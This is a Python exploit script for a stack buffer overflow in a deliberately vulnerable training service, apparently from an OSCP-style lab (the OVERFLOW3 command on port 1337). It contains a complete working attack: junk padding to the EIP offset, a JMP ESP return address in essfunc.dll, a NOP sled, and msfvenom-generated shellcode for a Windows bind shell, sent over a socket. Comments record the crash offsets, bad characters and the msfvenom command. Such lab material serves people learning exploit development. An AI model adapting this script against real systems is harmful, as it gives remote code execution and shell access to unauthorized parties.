import socket
import time


# Fuzzing shows crash at 1300 bytes input

host = "10.10.5.232"
port = 1337

offset = 1274

junk_data = bytearray(b"A" * offset)

return_address = bytearray(b"\x03\x12\x50\x62")

nop_num_bytes = 100
nop_sled = bytearray(b"\x90" * nop_num_bytes)

shell_code = (
    b"\xfc\xbb\xf7\xbe\xd9\x63\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
    b"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x0b\x56\x5b\x63\xf3"
    b"\xa7\x3c\xed\x16\x96\x7c\x89\x53\x89\x4c\xd9\x31\x26\x26\x8f"
    b"\xa1\xbd\x4a\x18\xc6\x76\xe0\x7e\xe9\x87\x59\x42\x68\x04\xa0"
    b"\x97\x4a\x35\x6b\xea\x8b\x72\x96\x07\xd9\x2b\xdc\xba\xcd\x58"
    b"\xa8\x06\x66\x12\x3c\x0f\x9b\xe3\x3f\x3e\x0a\x7f\x66\xe0\xad"
    b"\xac\x12\xa9\xb5\xb1\x1f\x63\x4e\x01\xeb\x72\x86\x5b\x14\xd8"
    b"\xe7\x53\xe7\x20\x20\x53\x18\x57\x58\xa7\xa5\x60\x9f\xd5\x71"
    b"\xe4\x3b\x7d\xf1\x5e\xe7\x7f\xd6\x39\x6c\x73\x93\x4e\x2a\x90"
    b"\x22\x82\x41\xac\xaf\x25\x85\x24\xeb\x01\x01\x6c\xaf\x28\x10"
    b"\xc8\x1e\x54\x42\xb3\xff\xf0\x09\x5e\xeb\x88\x50\x37\xd8\xa0"
    b"\x6a\xc7\x76\xb2\x19\xf5\xd9\x68\xb5\xb5\x92\xb6\x42\xb9\x88"
    b"\x0f\xdc\x44\x33\x70\xf5\x82\x67\x20\x6d\x22\x08\xab\x6d\xcb"
    b"\xdd\x46\x65\x6a\x8e\x74\x88\xcc\x7e\x39\x22\xa5\x94\xb6\x1d"
    b"\xd5\x96\x1c\x36\x7e\x6b\x9f\x29\x23\xe2\x79\x23\xcb\xa2\xd2"
    b"\xdb\x29\x91\xea\x7c\x51\xf3\x42\xea\x1a\x15\x54\x15\x9b\x33"
    b"\xf2\x81\x10\x50\xc6\xb0\x26\x7d\x6e\xa5\xb1\x0b\xff\x84\x20"
    b"\x0b\x2a\x7e\xc0\x9e\xb1\x7e\x8f\x82\x6d\x29\xd8\x75\x64\xbf"
    b"\xf4\x2c\xde\xdd\x04\xa8\x19\x65\xd3\x09\xa7\x64\x96\x36\x83"
    b"\x76\x6e\xb6\x8f\x22\x3e\xe1\x59\x9c\xf8\x5b\x28\x76\x53\x37"
    b"\xe2\x1e\x22\x7b\x35\x58\x2b\x56\xc3\x84\x9a\x0f\x92\xbb\x13"
    b"\xd8\x12\xc4\x49\x78\xdc\x1f\xca\x88\x97\x3d\x7b\x01\x7e\xd4"
    b"\x39\x4c\x81\x03\x7d\x69\x02\xa1\xfe\x8e\x1a\xc0\xfb\xcb\x9c"
    b"\x39\x76\x43\x49\x3d\x25\x64\x58\x3d\xc9\x9a\x63"
)

buffer = junk_data + return_address + nop_sled + shell_code

def sendExploit(host, port, buffer):
    prefix = bytearray("OVERFLOW3 ".encode("ascii"))
    suffix = bytearray("".encode("ascii"))

    exploitInput = prefix + buffer + suffix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as csocket:
        csocket.connect((host, port))
        print("[+] Client connected.")

        print(f"[!] Data received from server: {csocket.recv(1024).decode('ascii')}")

        print("[+] Attempting to send exploit input...")
        csocket.send(exploitInput)


# Send data
sendExploit(host, port, buffer)


        
# Comments:

# EIP at crash: 35714234
# ESP at crash: 018FFA30 -> 42367142

# EIP Pattern Offset: 1274
# ESP (0x018ffa30) points at offset 1278

# ESP points inside of the pattern
# We can use `JMP ESP` instruction
# to jump to our exploit input

# Bad chars: 0x00, 0x11, 0x40, 0x5f, 0xb8, 0xee

# msfvenom -p windows/shell_bind_tcp -f c -a x86 --platform windows -b '\x00\x11\x40\x5f\xb8\xee'

# `JMP ESP` Addresses without Bad chars
# 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
